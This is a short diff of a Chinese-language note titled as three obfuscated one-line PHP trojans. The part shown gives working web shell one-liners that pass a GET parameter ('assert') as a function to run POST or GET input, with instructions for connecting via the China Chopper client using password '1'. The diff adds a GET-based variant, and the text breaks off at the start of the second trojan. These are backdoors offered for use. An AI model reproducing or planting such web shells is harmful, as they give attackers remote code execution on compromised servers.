@@ -1,6 +1,7 @@
 ﻿三个变形的一句话PHP木马
 第一个
-<?php ($_=@$_GET[2]).@$_($_POST[1])?> 在菜刀里写http://site/1.php?2=assert密码是1 
+<?php ($_=@$_GET[2]).@$_($_POST[1])?> 在菜刀里写http://site/1.php?2=assert 密码是1 
+<?=($_=@$_GET[2]).@$_($_GET[1])?>  在菜刀里写http://site/1.php?2=assert 密码是1 
 第二个
 <?php
 $_="";
